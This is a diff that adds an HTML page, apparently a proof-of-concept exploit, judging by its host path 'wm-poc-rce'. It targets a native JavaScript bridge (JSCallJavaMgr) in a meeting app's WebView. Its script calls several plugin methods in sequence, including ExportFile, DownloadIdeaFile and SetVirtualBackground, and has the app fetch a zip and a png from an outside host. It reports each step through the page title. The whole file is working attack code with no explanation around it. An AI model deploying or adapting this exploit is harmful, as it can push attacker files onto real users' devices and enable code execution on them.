@@ -1,0 +1,42 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P90TPL</title></head>
+<body>
+<script>
+document.title='P90TPL:'+location.host;
+window.__p=function(r){
+  try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
+  document.title='P90TPLCB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,72);
+};
+function c(id,mod,m,p){
+  try{
+    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+      callback:'window.__p',module:mod,method:m,param:p,callId:id
+    }));
+  }catch(e){
+    document.title='P90TPL-NOJS:'+location.host;
+  }
+}
+setTimeout(function(){
+  if(!window.JSCallJavaMgr){document.title='P90TPL-NOMGR:'+location.host;return}
+  document.title='P90TPL-HAS:'+location.host;
+  var zip='https://gitwhs.github.io/wm-poc-rce/p50.zip';
+  var png='https://gitwhs.github.io/wm-poc-rce/p40.png';
+  var q=[
+    ['TH2','CommonPlugin','GetPerformance',{}],
+    ['EX','CommonPlugin','ExportFile',{fileName:'p90.bin',contentType:'application/octet-stream',url:zip}],
+    ['ID','IdeaWebViewPlugin','DownloadIdeaFile',{url:zip,idea_id:'p90',content_type:'zip',idea_title:'p90',meeting_code:'123456789'}],
+    ['SV','VirtualBackgroundWebPlugin','SetVirtualBackground',{url:png,over_write:true}],
+    ['DF','VirtualBackgroundWebPlugin','DownloadFile',{url:png}]
+  ];
+  var i=0;
+  function n(){
+    if(i>=q.length){document.title='P90TPL-DONE:'+location.host;return}
+    var x=q[i++];
+    document.title='P90TPL-RUN:'+x[0]+':'+location.host;
+    c(x[0],x[1],x[2],x[3]);
+    setTimeout(n, 3500);
+  }
+  setTimeout(n, 800);
+}, 600);
+</script>
+</body></html>
